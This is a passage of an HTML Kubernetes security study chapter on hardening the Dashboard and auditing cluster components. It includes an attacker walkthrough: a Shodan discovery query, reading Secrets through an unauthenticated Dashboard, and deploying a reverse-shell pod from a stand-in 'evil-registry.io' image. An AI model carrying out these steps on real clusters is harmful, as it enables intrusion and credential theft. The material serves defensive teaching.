            <section class="section-block" id="s5-1">
                <h3 class="section-h">5.1 Why the Dashboard Is Dangerous</h3>
                <p>The Kubernetes Dashboard is not inherently insecure — but its <strong>default deployment model</strong> is. When you install the Dashboard from the official manifest without modifications, it creates a ServiceAccount with <strong>cluster-admin privileges</strong> and exposes a web interface. If that web interface is reachable from the internet — through a LoadBalancer Service, a NodePort, or an Ingress without authentication — anyone with a browser can manage your entire cluster. This is not a hypothetical scenario. It is exactly how Tesla was breached in 2018: attackers found an exposed Dashboard, used its admin privileges to deploy crypto-mining containers, and extracted AWS credentials from the cluster environment.</p>

                <div class="info-box danger">
                    <h5>🔴 The Tesla Breach — A Dashboard Story</h5>
                    <p>Tesla's Kubernetes Dashboard was accessible from the public internet with <strong>no authentication required</strong>. The Dashboard's default ServiceAccount had cluster-admin. Attackers used Shodan (a search engine for internet-connected devices) to find the Dashboard, logged in without credentials, deployed crypto-mining pods, and extracted AWS IAM credentials stored in Kubernetes Secrets — all through the Dashboard's point-and-click interface. No exploit was needed. No vulnerability was exploited. The attack succeeded because the Dashboard was exposed and over-privileged — two defaults that the CKS curriculum teaches you to fix.</p>
                </div>

                <h4>Dashboard Exposure Risk Matrix</h4>
                <div class="comparison-table">
                    <table>
                        <thead><tr><th>How Is Dashboard Exposed?</th><th>Risk Level</th><th>What Attacker Can Do</th><th>Example</th></tr></thead>
                        <tbody>
                            <tr><td><strong>Public Internet, No Auth</strong> (LoadBalancer/NodePort)</td><td style="color:#ef4444;">🔴 CRITICAL</td><td>Full cluster access — create, delete, read any resource, exec into any pod, read all Secrets</td><td>Tesla 2018: crypto-mining + AWS credential theft</td></tr>
                            <tr><td><strong>Public Internet, With Token</strong> (no extra network controls)</td><td style="color:#f97316;">🟠 HIGH</td><td>If the token is stolen — full access</td><td>Token exposure via developer laptop compromise</td></tr>
                            <tr><td><strong>Internal Only, with RBAC</strong> (ClusterIP, limited SA)</td><td style="color:#eab308;">🟡 MEDIUM</td><td>Limited to what scoped RBAC allows</td><td>Insider threat with valid credentials</td></tr>
                            <tr><td><strong>kubectl proxy Only (localhost)</strong> + strong RBAC + no public exposure</td><td style="color:#22c55e;">🟢 LOW</td><td>Only the person running kubectl proxy can access it</td><td>Secure admin workflow — the CKS-recommended pattern</td></tr>
                        </tbody>
                    </table>
                </div>

                <h4>What the Dashboard Can Do — And Why That Matters</h4>
                <p>Many administrators underestimate the Dashboard because they think of it as "just a UI." But the Dashboard exposes <strong>every API verb on every resource type</strong> that its ServiceAccount has access to. With cluster-admin (the default), that means:</p>
                <div class="card-grid cols-3">
                    <div class="info-card">
                        <div class="card-icon-lg">📦</div>
                        <h5>Workload Control</h5>
                        <p>Create, scale, edit, and delete Deployments, StatefulSets, DaemonSets, Jobs, and CronJobs. Deploy backdoors as innocent-looking pods.</p>
                    </div>
                    <div class="info-card">
                        <div class="card-icon-lg">🔑</div>
                        <h5>Secret Access</h5>
                        <p>View and decode ALL Secrets in all namespaces — database passwords, API keys, TLS private keys, cloud credentials.</p>
                    </div>
                    <div class="info-card">
                        <div class="card-icon-lg">🐚</div>
                        <h5>Pod Shell Access</h5>
                        <p>Click a button to get a terminal shell inside ANY running container — no kubectl needed.</p>
                    </div>
                </div>

                <div class="info-box warning">
                    <h5>⚠️ The Dashboard Is a Cluster-Admin GUI — Treat It Like One</h5>
                    <p>The Dashboard is not a monitoring tool. It is not a read-only status page. It is a <strong>full-control graphical interface to the Kubernetes API</strong>. Every security control you apply to kubectl access — RBAC, OIDC, audit logging — must also be applied to the Dashboard. If you would not give every developer cluster-admin via kubectl, do not give it to them via the Dashboard.</p>
                </div>

                <h4>How Attackers Find Exposed Dashboards — The Shodan Connection</h4>
                <p>Shodan is a search engine that indexes internet-connected devices — not web pages. It constantly scans the entire IPv4 address space, fingerprinting services on every port. When it finds a service responding on port 443 or 8443 with Kubernetes-specific HTTP headers (<code>Audit-Id</code>, <code>Kubernetes</code> response headers), it tags it as a Kubernetes API or Dashboard. An attacker simply searches Shodan for <code>product:"Kubernetes"</code> and gets a list of IP addresses with exposed Dashboards — complete with screenshots of the login page. If the Dashboard's "Skip" button is enabled (which it is by default in older versions), the attacker clicks it and gains cluster-admin access. No exploit. No vulnerability. Just a search engine query and a browser. This is not a theoretical attack path — this is exactly what happened to Tesla, and it is what continues to happen to hundreds of unsecured clusters discovered every month.</p>

                <h4>Dashboard vs kubectl — Why the GUI Is More Dangerous</h4>
                <p>At first glance, the Dashboard seems equivalent to kubectl — both are clients that talk to the same API server with the same RBAC rules. But the Dashboard introduces unique risks that kubectl does not:</p>
                <div class="comparison-table">
                    <table>
                        <thead><tr><th>Attack Surface</th><th>kubectl</th><th>Dashboard</th></tr></thead>
                        <tbody>
                            <tr><td><strong>Network Exposure</strong></td><td>Local CLI tool. No listening port. No network exposure.</td><td>Web server listening on a port. If exposed via LB/NodePort/Ingress, reachable from anywhere.</td></tr>
                            <tr><td><strong>Phishing Risk</strong></td><td>None. kubectl is a terminal program.</td><td><strong>HIGH.</strong> A fake Dashboard login page can steal bearer tokens. Tokens grant permanent API access.</td></tr>
                            <tr><td><strong>Session Persistence</strong></td><td>No session. Each kubectl command is a discrete API call.</td><td>Browser session with a stored token. If the browser is compromised (XSS, malicious extension), the token is stolen.</td></tr>
                            <tr><td><strong>CSRF Vulnerability</strong></td><td>Not applicable. No browser involved.</td><td>Without CSRF protection, a malicious website can make Dashboard API calls using the user's authenticated session.</td></tr>
                            <tr><td><strong>Audit Trail Clarity</strong></td><td>kubectl commands are clearly logged with user identity.</td><td>All Dashboard actions appear as the Dashboard's ServiceAccount in audit logs — individual user identity is lost unless OIDC is configured.</td></tr>
                            <tr><td><strong>"Skip" Button</strong></td><td>No equivalent. kubectl always requires credentials.</td><td>Older Dashboard versions have a "Skip" button that bypasses authentication entirely. This is how Tesla was breached.</td></tr>
                        </tbody>
                    </table>
                </div>

                <h4>The "Skip" Button — Tesla's Fatal Misconfiguration</h4>
                <p>Kubernetes Dashboard versions prior to 2.0.0 included a <strong>"Skip" button on the login page</strong>. This button was not a bug — it was a deliberate feature for development environments. When clicked, it granted the user the Dashboard ServiceAccount's permissions with zero authentication. Since the default Dashboard ServiceAccount had cluster-admin, clicking "Skip" gave full cluster control to anyone who could reach the login page. Tesla's Dashboard had this button enabled AND was exposed on the public internet. The attacker did not need a password, a token, or an exploit. They clicked a button. In Dashboard 2.0.0+, the "Skip" button is disabled by default, but it can still be re-enabled with the <code>--enable-skip-login</code> flag. <strong>Never use this flag in any environment — including development.</strong></p>

                <h4>Dashboard Attack Walkthrough — The Exact Sequence</h4>
                <p>This is the attacker's perspective — the exact steps that compromised Tesla and continue to compromise unsecured clusters every day:</p>
                <div class="diagram-container">
                    <div class="diagram-title">Phase 1-2: Discovery → Access (under 2 minutes)</div>
<pre>
  $ shodan search 'product:"Kubernetes" ssl:"Dashboard"' --fields ip_str,port
  203.0.113.42  8443    ← Exposed Dashboard found

  Attacker opens https://203.0.113.42:8443 in a browser.
  → Dashboard login page. "Skip" button present.
  → Click "Skip" → Logged in as cluster-admin.
  → No password. No token. No exploit required.

  PHASE 3: Credential Extraction (2 minutes)
  ─────────────────────────────────────────
  Dashboard → Config &amp; Storage → Secrets → easypj-prod
  → easypj-db-credentials: DATABASE_URL=postgres://user:pass@db:5432/jobpost
  → aws-s3-backup: AWS_ACCESS_KEY_ID + AWS_SECRET_ACCESS_KEY
  → easypj-tls: TLS private key for easypj.com

  PHASE 4: Persistence (3 minutes)
  ────────────────────────────────
  Dashboard → Workloads → Create → Pod
  Name: nginx-backdoor
  Image: evil-registry.io/reverse-shell:latest
  → Pod deploys. Reverse shell calls home. Permanent access established.

  TOTAL: ~7 minutes. Attacker has: all Secrets, cloud credentials, backdoor.
</pre>
                </div>

                <h4>Dashboard Deployment Decision Tree</h4>
                <div class="decision-tree">
                    <div class="decision-node question">🖥️ Do you truly need a web UI, or is kubectl/k9s/Lens sufficient?</div>
                    <div class="decision-branches">
                        <div><div class="decision-node no">❌ kubectl is enough → Skip Dashboard entirely. Zero attack surface is always more secure.</div></div>
                        <div><div class="decision-node yes">✅ UI needed → Continue.</div></div>
                    </div>
                    <div class="decision-node question">🔐 Can you enforce OIDC with MFA (Google, Azure AD, Okta)?</div>
                    <div class="decision-branches">
                        <div><div class="decision-node yes">✅ Yes → Deploy with OIDC + ClusterIP + NetworkPolicy. Enterprise-grade. Users authenticate via IdP.</div></div>
                        <div><div class="decision-node no">⚠️ No OIDC → Use kubectl port-forward + scoped SA token only. Never expose on network.</div></div>
                    </div>
                    <div class="decision-node question">🌐 Does access need to work remotely?</div>
                    <div class="decision-branches">
                        <div><div class="decision-node no">✅ Local only → kubectl proxy on localhost. Zero network exposure.</div></div>
                        <div><div class="decision-node yes">⚠️ Remote → VPN only. NetworkPolicy restricts to VPN CIDR. Never public internet.</div></div>
                    </div>
                </div>
            </section>

            <!-- ─────────── §5.2 ─────────── -->
            <section class="section-block" id="s5-2">
                <h3 class="section-h">5.2 Deploying Dashboard Securely</h3>
                <p>Securing the Dashboard involves three independent controls that must all be applied: <strong>network isolation</strong> (no public IP), <strong>authentication</strong> (token or OIDC required), and <strong>authorization</strong> (RBAC-scoped ServiceAccount). Any single control missing re-opens the attack surface.</p>

                <h4>Secure Dashboard Access — The Correct Workflow</h4>
                <div class="split-panel">
                    <div class="split-side split-bad">
                        <h5>❌ Insecure — Never Do This</h5>
                        <ul>
                            <li><code>kubectl expose deploy kubernetes-dashboard --type=LoadBalancer --port=443</code></li>
                            <li>Dashboard on a public IP — anyone can reach it</li>
                            <li>Default ServiceAccount has cluster-admin</li>
                            <li>No NetworkPolicy restricting access</li>
                            <li>No OIDC or token authentication enforced</li>
                        </ul>
                        <p style="color:#60a5fa;font-weight:700;">RESULT: Tesla breach redux. Attacker finds your Dashboard on Shodan.</p>
                    </div>
                    <div class="split-side split-good">
                        <h5>✅ Secure — The CKS Way</h5>
                        <ul>
                            <li>Step 1: Dashboard Service type is ClusterIP (internal only)</li>
                            <li>Step 2: <code>kubectl port-forward -n kubernetes-dashboard svc/kubernetes-dashboard 8443:443</code></li>
                            <li>Step 3: Access at <code>https://localhost:8443</code> — only from your local machine</li>
                            <li>Step 4: Login with a scoped ServiceAccount token (read-only, namespace-scoped)</li>
                            <li>Step 5: NetworkPolicy denies ALL ingress to Dashboard except from admin machines</li>
                        </ul>
                        <p style="color:#4ade80;font-weight:700;">RESULT: Zero network exposure. Token-scoped access. Secure.</p>
                    </div>
                </div>

                <h4>Secure Dashboard Deployment — The Actual Manifest</h4>
                <p>The workflow above describes the correct process. Here is what it looks like as a real <code>Deployment</code> + <code>Service</code> manifest, with every hardening control from this chapter applied at once — network isolation, no skip-login, a scoped identity, and container-level lockdown:</p>
                <div class="diagram-container">
                    <div class="diagram-title">Hardened kubernetes-dashboard Deployment + Service — every control applied together</div>
<pre>
  apiVersion: apps/v1
  kind: Deployment
  metadata:
    name: kubernetes-dashboard
    namespace: kubernetes-dashboard
    labels:
      k8s-app: kubernetes-dashboard
  spec:
    replicas: 1
    selector:
      matchLabels:
        k8s-app: kubernetes-dashboard
    template:
      metadata:
        labels:
          k8s-app: kubernetes-dashboard
      spec:
        serviceAccountName: dashboard-reader     # scoped SA below — NEVER cluster-admin
        automountServiceAccountToken: false      # dashboard proxies USER tokens, not its own
        containers:
        - name: kubernetes-dashboard
          image: docker.io/kubernetesui/dashboard:v2.7.0
          args:
            - --auto-generate-certificates
            - --namespace=kubernetes-dashboard
            # NOTE: --enable-skip-login is DELIBERATELY absent.
            #       This single missing flag is what Tesla got wrong in 2018.
          ports:
          - containerPort: 8443
          securityContext:                       # container escape hardening (Ch18)
            runAsNonRoot: true
            runAsUser: 1001
            readOnlyRootFilesystem: true
            allowPrivilegeEscalation: false
            capabilities:
              drop: ["ALL"]
          resources:                              # DoS protection — cap runaway usage
            requests: { cpu: "100m", memory: "128Mi" }
            limits:   { cpu: "250m", memory: "256Mi" }
          volumeMounts:
          - name: tmp-volume
            mountPath: /tmp                       # writable scratch space only —
        volumes:                                  # readOnlyRootFilesystem needs this
        - name: tmp-volume
          emptyDir: {}
  ---
  apiVersion: v1
  kind: Service
  metadata:
    name: kubernetes-dashboard
    namespace: kubernetes-dashboard
  spec:
    type: ClusterIP                # ← THE single most important line in this file.
    ports:                         #   Change this to NodePort/LoadBalancer and
    - port: 443                    #   every other control below becomes irrelevant.
      targetPort: 8443
    selector:
      k8s-app: kubernetes-dashboard
</pre>
                </div>
                <p>Notice that no single line here does all the work — it is the combination that matters. <code>type: ClusterIP</code> stops network reachability. The absent <code>--enable-skip-login</code> stops authentication bypass. <code>serviceAccountName: dashboard-reader</code> stops privilege escalation once inside. <code>readOnlyRootFilesystem</code> and dropped capabilities stop the container itself from being used as a foothold even if the dashboard process is exploited. Delete any one of these and you have re-opened part of the exact path Tesla's attackers walked.</p>

                <h4>Creating a Restricted ServiceAccount for Dashboard</h4>
                <p>The Dashboard's default ServiceAccount has cluster-admin. The first hardening step is creating a dedicated, restricted ServiceAccount with read-only access scoped to specific namespaces:</p>
                <div class="diagram-container">
                    <div class="diagram-title">Restricted Dashboard ServiceAccount — read-only, namespace-scoped</div>
<pre>
  apiVersion: v1
  kind: ServiceAccount
  metadata:
    name: dashboard-reader
    namespace: kubernetes-dashboard
  ---
  apiVersion: rbac.authorization.k8s.io/v1
  kind: ClusterRole
  metadata:
    name: dashboard-readonly
  rules:
  - apiGroups: [""]
    resources: ["pods", "services", "configmaps", "persistentvolumeclaims"]
    verbs: ["get", "list", "watch"]        # READ ONLY
  # NOTE: Secrets deliberately NOT included.
  ---
  apiVersion: rbac.authorization.k8s.io/v1
  kind: ClusterRoleBinding
  metadata:
    name: dashboard-reader-binding
  subjects:
  - kind: ServiceAccount
    name: dashboard-reader
    namespace: kubernetes-dashboard
  roleRef:
    kind: ClusterRole
    name: dashboard-readonly
    apiGroup: rbac.authorization.k8s.io
  ---
  $ kubectl create token dashboard-reader -n kubernetes-dashboard
  → Use THIS token to log in — NOT the admin token.
</pre>
                </div>

                <h4>NetworkPolicy — Restrict Dashboard Access to Admin IPs</h4>
                <div class="diagram-container">
                    <div class="diagram-title">Only allow Dashboard access from admin IP 10.0.0.100</div>
<pre>
  apiVersion: networking.k8s.io/v1
  kind: NetworkPolicy
  metadata:
    name: dashboard-access
    namespace: kubernetes-dashboard
  spec:
    podSelector:
      matchLabels:
        k8s-app: kubernetes-dashboard
    policyTypes:
    - Ingress
    ingress:
    - from:
      - ipBlock:
          cidr: 10.0.0.100/32             # Only this admin IP
      ports:
      - port: 8443
    # All other traffic → DENIED

  # VERIFY:
  $ kubectl run test --rm -it --image=busybox -- sh
  / # wget -O- https://kubernetes-dashboard.kubernetes-dashboard:8443
  → Connection TIMEOUT (blocked by NetworkPolicy)
</pre>
                </div>

                <div class="info-box tip">
                    <h5>💡 OIDC — The Enterprise Authentication Pattern</h5>
                    <p>For production clusters, token-based auth is insufficient — tokens are static, long-lived, and easy to leak. The enterprise pattern is <strong>OIDC integration</strong>: configure the API server with <code>--oidc-issuer-url</code> and <code>--oidc-client-id</code> pointing to your identity provider (Google Workspace, Azure AD, Okta). The Dashboard then redirects users to the IdP for login, which can enforce MFA, device trust, and session timeouts. OIDC is covered in detail in Chapter 8.</p>
                </div>

                <h4>How the Dashboard Token Login Actually Works</h4>
                <p>Understanding the internal flow helps you diagnose authentication issues on the exam. When you paste a token into the Dashboard login page, here is exactly what happens behind the scenes:</p>
                <div class="diagram-container">
                    <div class="diagram-title">Dashboard Token Authentication — Internal Flow</div>
<pre>
  1. You paste a bearer token into the Dashboard login page and click "Sign In"

  2. The Dashboard stores the token in the browser's localStorage:
     localStorage.setItem('kubernetes-dashboard-token', '&lt;your-token&gt;')
     ⚠️  This means ANY JavaScript running in the browser context
         (including malicious browser extensions) can read this token.

  3. Every Dashboard API request includes the token as an HTTP header:
     Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9...

  4. The API server receives the request → extracts the token → validates:
     a. Is the JWT signature valid? (signed by the SA token controller)
     b. Is the token expired? (if using bound tokens with expiration)
     c. Is the ServiceAccount still active?

  5. If valid → the API server identifies the user as:
     system:serviceaccount:&lt;namespace&gt;:&lt;serviceaccount-name&gt;
     And checks RBAC: does this SA have the requested permission?

  6. The Dashboard UI renders based on what the API returns.
     Resources the SA cannot see → simply do not appear in the UI.
     (This is why read-only SAs see pods but not Secrets — RBAC hides them.)

  🔑 KEY INSIGHT: The Dashboard has NO authentication logic of its own.
     It is a transparent proxy. All auth decisions are made by the API server.
     This means securing the Dashboard = securing the API server's RBAC.
</pre>
                </div>

                <h4>Verifying Your Dashboard Is Actually Secure — A Checklist</h4>
                <p>After configuring the Dashboard, run through these verification steps. On the CKS exam, one of these checks may reveal that you missed a step:</p>
                <div class="scenario-box positive">
                    <h5>✅ Dashboard Security Verification Checklist</h5>
                    <ul>
                        <li><strong>Check 1: Network exposure.</strong> <code>kubectl get svc -n kubernetes-dashboard</code> — TYPE must be ClusterIP. If it is NodePort or LoadBalancer, fix it immediately.</li>
                        <li><strong>Check 2: External reachability.</strong> From a machine outside the cluster, try <code>curl -k https://&lt;any-node-ip&gt;:&lt;nodeport&gt;</code> — must return "Connection refused" or timeout. If it returns HTML, your Dashboard is exposed.</li>
                        <li><strong>Check 3: Token scope.</strong> <code>kubectl auth can-i --list --as=system:serviceaccount:kubernetes-dashboard:dashboard-reader</code> — verify that only read-only verbs appear. If "create", "delete", or "*" appear, the SA is over-privileged.</li>
                        <li><strong>Check 4: Secret access.</strong> <code>kubectl auth can-i get secrets --as=system:serviceaccount:kubernetes-dashboard:dashboard-reader</code> — must return "no". The Dashboard SA should NEVER be able to read Secrets.</li>
                        <li><strong>Check 5: NetworkPolicy enforcement.</strong> From any pod in a different namespace, try <code>curl https://kubernetes-dashboard.kubernetes-dashboard:8443</code> — must timeout. If it connects, your NetworkPolicy is not working.</li>
                        <li><strong>Check 6: Skip button.</strong> Access the Dashboard URL and verify the login page does NOT have a "Skip" button. If it does, the <code>--enable-skip-login</code> flag is set — remove it immediately.</li>
                    </ul>
                </div>

                <h4>Modern Dashboard Deployment (v3.x) — Helm-Only, the Kong Gateway, and a Project Status Every CKS Candidate Should Know</h4>
                <p>Everything above — the raw <code>Deployment</code>/<code>Service</code> manifest, the <code>docker.io/kubernetesui/dashboard:v2.7.0</code> image, the direct <code>kubernetes-dashboard</code> Service name — describes the <strong>Dashboard v2.x architecture</strong>, which is still exactly what many existing clusters, CKS practice environments, and older documentation run today. Starting with <strong>Dashboard v3</strong>, the project rebuilt its deployment model from scratch, and the current official kubernetes.io documentation reflects that rebuilt model exclusively. Know both shapes: the exam and a large share of real clusters still run the v2.x shape taught above, but any cluster you stand up going forward is more likely to look like this.</p>

                <div class="info-box note">
                    <h5>📖 v2.x Raw Manifest vs. v3.x Helm Chart — Two Real Shapes, the Same Security Rules</h5>
                    <p>The official docs now state plainly: <em>"Dashboard currently supports Helm-based installation only."</em> Every hardening principle taught in this chapter — no public exposure, no skip-login, least-privilege ServiceAccount, NetworkPolicy — applies identically to both shapes; nothing above is wrong or wasted knowledge. What changes is only the <em>mechanics</em>: v3's Helm chart deploys a bundled <strong>Kong API gateway</strong> in front of the Dashboard's own containers, so the Service you patch to ClusterIP and the Service you <code>port-forward</code> is no longer named plain <code>kubernetes-dashboard</code> — it's <code>&lt;release-name&gt;-kong-proxy</code>. If you only ever practiced against the v2.x name, don't be caught looking for a Service that doesn't exist on a v3 cluster.</p>
                </div>

                <div class="diagram-container">
                    <div class="diagram-title">Installing and accessing Dashboard v3.x the way current official docs describe it</div>
<pre>
  # Install — Helm is the ONLY supported method for v3.x (no more recommended.yaml)
  $ helm repo add kubernetes-dashboard https://kubernetes.github.io/dashboard/
  $ helm upgrade --install kubernetes-dashboard kubernetes-dashboard/kubernetes-dashboard \
      --create-namespace --namespace kubernetes-dashboard

  # Access — same "never expose it" rule as v2.x, but a DIFFERENT Service name
  $ kubectl -n kubernetes-dashboard port-forward svc/kubernetes-dashboard-kong-proxy 8443:443
  # → https://localhost:8443 — access is STILL local-machine-only, exactly like v2.x

  # Everything else you already learned still applies, unchanged:
  #   - type: ClusterIP is still the only acceptable Service type
  #   - a scoped, read-only ServiceAccount is still the only acceptable identity
  #   - NetworkPolicy still restricts who can even reach the Kong gateway pod
</pre>
                </div>

                <div class="card-grid cols-2">
                    <div class="info-card">
                        <div class="card-icon-lg">🗄️</div>
                        <h5>Project Status — Archived</h5>
                        <p>As of the most recently published Helm chart release (<code>kubernetes-dashboard-7.14.0</code>, October 2025), the <code>kubernetes/dashboard</code> repository has been <strong>archived by its maintainers</strong> — its README states it is "now archived and no longer maintained due to lack of active maintainers and contributors." It still runs and is still installable; there simply won't be new features, CVE patches, or bug fixes going forward. Factor this into the §5.4 "should it even exist" decision — an unmaintained internet-facing admin UI is a standing risk even before you consider misconfiguration.</p>
                    </div>
                    <div class="info-card">
                        <div class="card-icon-lg">🔭</div>
                        <h5>The Successor — Headlamp</h5>
                        <p>Kubernetes SIG UI now points new installations at <strong>Headlamp</strong> (<code>kubernetes-sigs/headlamp</code>), adopted as an incubating sig-ui project and named in the archived Dashboard's own README as its recommended replacement. Same threat model applies without exception: it is still a full-control web UI to your API server, so every control in this chapter — ClusterIP only, scoped RBAC, no anonymous/skip auth, NetworkPolicy — is exactly as mandatory for Headlamp as it was for the Dashboard. The CKS exam itself is still written against the classic Dashboard's mechanics, so keep both names in your mental map rather than assuming one has replaced the other on the exam.</p>
                    </div>
                </div>
            </section>

            <!-- ─────────── §5.3 ─────────── -->
            <section class="section-block" id="s5-3">
                <h3 class="section-h">5.3 Removing Unnecessary Components</h3>
                <p>Security is not just about configuring things correctly — it is also about <strong>removing things you do not need</strong>. Every component, every open port, every installed add-on is part of your attack surface. The CIS Benchmark explicitly requires you to audit your cluster for unnecessary components.</p>

                <div class="info-box note">
                    <h5>📖 The Principle of Minimization</h5>
                    <p>The fewer components running, the fewer targets for attackers. The fewer open ports, the fewer entry points. The fewer RBAC permissions, the less damage from a compromised credential. <strong>If you do not need it, remove it.</strong> Before installing the Dashboard, ask: "Do I actually need it, or can I manage this cluster with kubectl?"</p>
                </div>

                <h4>Pre-Production Cluster Component Audit Checklist</h4>
                <div class="diagram-container">
                    <div class="diagram-title">The Component Audit — 13 Questions to Ask</div>
<pre>
  □ Is Dashboard installed? → Only accessible via port-forward or VPN?
  □ Any LoadBalancer Services? → Audit every one.
  □ Any NodePort Services? → Opens on EVERY node.
  □ --insecure-port=0 on API server?
  □ kubelet readOnlyPort: 0?
  □ Any pods using hostNetwork: true unnecessarily?
  □ Any pods using hostPID: true unnecessarily?
  □ Any pods using privileged: true unnecessarily?
  □ Any pods with dangerous Linux capabilities (SYS_ADMIN, NET_RAW)?
  □ Any alpha feature gates enabled? (--feature-gates=...)
  □ Any wildcard (*) RBAC bindings?
  □ Any Services with externalIPs set?
  □ Any unused namespaces with lingering resources?
</pre>
                </div>

                <h4>Beyond the Checklist — Three Critical Minimizations</h4>
                <p>Three items on the checklist deserve extra attention because they are commonly overlooked — and each one enables container escape or cluster compromise:</p>

                <div class="card-grid cols-3">
                    <div class="info-card">
                        <div class="card-icon-lg">⚠️</div>
                        <h5>Privileged Pods</h5>
                        <p><code>privileged: true</code> in a SecurityContext gives the container ALL Linux capabilities and access to ALL host devices. This is essentially the same as running as root on the node. <strong>Never use privileged unless absolutely required</strong> — and if required, isolate those pods with PodSecurity, NetworkPolicy, and runtime sandboxing. <strong>Audit:</strong> <code>kubectl get pods -A -o json | jq '.items[]|select(.spec.containers[].securityContext.privileged==true)|.metadata.name'</code></p>
                    </div>
                    <div class="info-card">
                        <div class="card-icon-lg">🧪</div>
                        <h5>Alpha Feature Gates</h5>
                        <p>Kubernetes alpha features are disabled by default for a reason — they are unstable, poorly tested, and may have unknown security implications. Enabling alpha feature gates on a production cluster expands your attack surface with untested code. <strong>Audit the API server manifest for --feature-gates=...</strong> flags. Every alpha feature enabled is a potential vulnerability. Remove any that are not explicitly required for your workload.</p>
                    </div>
                    <div class="info-card">
                        <div class="card-icon-lg">🔌</div>
                        <h5>VPN-Only Access</h5>
                        <p>kubectl proxy and port-forward are secure because they bind to localhost. But they require an SSH session to a node or a local kubeconfig. The enterprise alternative is <strong>VPN-only Dashboard access</strong>: the Dashboard is a ClusterIP service, and the VPN subnet is the only CIDR allowed in the NetworkPolicy. This allows remote access while maintaining zero public exposure. <strong>No VPN connection = no Dashboard. Simple and secure.</strong></p>
                    </div>
                </div>

                <h4>Critical Ports — What Should (and Should NOT) Be Open</h4>
                <div class="comparison-table">
                    <table>
                        <thead><tr><th>Port</th><th>Component</th><th>Should It Be Open?</th><th>Action If Unnecessary</th></tr></thead>
                        <tbody>
                            <tr><td><strong>6443</strong></td><td>API Server (secure)</td><td style="color:#4ade80;">✅ Required</td><td>Restrict with firewall to trusted IPs only</td></tr>
                            <tr><td><strong>2379</strong></td><td>etcd client</td><td style="color:#4ade80;">✅ API server only</td><td>Firewall: restrict to API server IP only</td></tr>
                            <tr><td><strong>10250</strong></td><td>kubelet API</td><td style="color:#eab308;">⚠️ Internal only</td><td>Webhook auth required</td></tr>
                            <tr><td><strong>10255</strong></td><td>kubelet read-only</td><td style="color:#ef4444;">🔴 DISABLE</td><td>readOnlyPort: 0. No auth on this port.</td></tr>
                            <tr><td><strong>8080</strong></td><td>API Server insecure</td><td style="color:#ef4444;">🔴 DISABLE</td><td>--insecure-port=0</td></tr>
                            <tr><td><strong>8001</strong></td><td>kubectl proxy</td><td style="color:#eab308;">⚠️ Localhost only</td><td>Bind to 127.0.0.1 only</td></tr>
                            <tr><td><strong>30000-32767</strong></td><td>NodePort range</td><td style="color:#eab308;">⚠️ Audit carefully</td><td>Opens on every node's public interface</td></tr>
                        </tbody>
                    </table>
                </div>

                <div class="info-box note">
                    <h5>📖 Version Reality Check — Which of These Two "Disable It" Checks Still Apply?</h5>
                    <p>The audit checklist's <code>--insecure-port=0</code> and "kubelet read-only port" items are both real CIS Benchmark findings, but they have aged very differently — and the CKS exam runs on a recent Kubernetes version, so it matters which one you can actually still find:</p>
                    <ul>
                        <li><strong><code>--insecure-port</code> (API server, port 8080):</strong> deprecated as a no-op in <strong>v1.20</strong> (only <code>0</code> was ever accepted after that) and <strong>removed entirely in v1.24</strong>. On any current exam cluster or modern production cluster, this flag doesn't exist on the API server binary at all — passing it causes the API server to fail to start. Treat this checklist item as "verify it is ABSENT from the manifest," not "verify it is set to 0."</li>
                        <li><strong>Kubelet read-only port 10255:</strong> still a live, configurable field (<code>readOnlyPort</code> in <code>KubeletConfiguration</code>) — NOT removed. Historically it defaulted to <code>10255</code> when no config file was used; it now defaults to <code>0</code> (disabled) for new clusters on <strong>kubelet v1.32+</strong>. This means the check is still fully relevant: older clusters, clusters upgraded in place from before 1.32, and any explicit <code>readOnlyPort: 10255</code> left in a drop-in config can all still have this open. Always verify explicitly with <code>kubectl proxy</code> + a raw request to the kubelet, or by reading the live <code>KubeletConfiguration</code> — never assume "new version, so it must be off."</li>
                    </ul>
                </div>

                <h4>How to Actually Remove and Verify Component Cleanup</h4>
                <p>The audit checklist tells you what to look for — but you also need to know the exact commands to fix each finding. Here is the actionable remediation for every checklist item, plus verification that the fix took effect:</p>
                <div class="diagram-container">
                    <div class="diagram-title">Component Audit → Fix → Verify — The Complete Workflow</div>
<pre>
  FINDING 1: Dashboard installed but unused
  ─────────────────────────────────────────
  FIX (legacy v2.x raw-manifest install):
          kubectl delete -f https://raw.githubusercontent.com/kubernetes/dashboard/v2.7.0/aio/deploy/recommended.yaml
          kubectl delete ns kubernetes-dashboard
  FIX (current v3.x Helm install — see the "Modern Dashboard Deployment"
       callout in §5.2; v3+ ships Helm-only, there is no recommended.yaml):
          helm uninstall kubernetes-dashboard -n kubernetes-dashboard
          kubectl delete ns kubernetes-dashboard
  VERIFY: kubectl get ns kubernetes-dashboard → "Error from server (NotFound)"

  FINDING 2: Unnecessary LoadBalancer Services
  ──────────────────────────────────────────────
  FIX:    kubectl patch svc &lt;name&gt; -n &lt;ns&gt; -p '{"spec":{"type":"ClusterIP"}}'
          # This removes the cloud load balancer and the public IP
  VERIFY: kubectl get svc &lt;name&gt; -n &lt;ns&gt; → TYPE must now be ClusterIP

  FINDING 3: Unnecessary NodePort Services
  ─────────────────────────────────────────
  FIX:    Same as LoadBalancer — change type to ClusterIP
  VERIFY: kubectl get svc -A | grep NodePort → should return nothing
          (or only intentional, documented NodePorts)

  FINDING 4: Pods with hostNetwork: true
  ───────────────────────────────────────
  FIX:    Edit the Deployment/DaemonSet and remove hostNetwork: true
  VERIFY: kubectl get pods -A -o json | jq '.items[]|select(.spec.hostNetwork==true)|.metadata.name'
          → Should return nothing (or only documented, intentional pods)

  FINDING 5: Wildcard RBAC bindings
  ──────────────────────────────────
  FIX:    kubectl delete clusterrolebinding &lt;binding-name&gt;
          Then create a properly scoped replacement with specific users/groups
  VERIFY: kubectl get clusterrolebindings -o yaml | grep -c '\*'
          → Should be 0 (or only documented, intentional wildcards)

  FINDING 6: Services with externalIPs
  ─────────────────────────────────────
  FIX:    kubectl patch svc &lt;name&gt; -n &lt;ns&gt; --type json \
            -p='[{"op":"remove","path":"/spec/externalIPs"}]'
  VERIFY: kubectl get svc -A -o yaml | grep externalIPs
          → Should return nothing
</pre>
                </div>

                <h4>How CIS Benchmark 5.x Maps to Unnecessary Component Removal</h4>
                <p>The CIS Kubernetes Benchmark dedicates an entire section (Section 5) to policies that govern what should and should not be running in your cluster. These checks are directly relevant to the CKS exam because they represent the most common configuration mistakes that lead to breaches. Understanding this mapping helps you connect the audit checklist above back to specific CIS controls:</p>
                <div class="comparison-table">
                    <table>
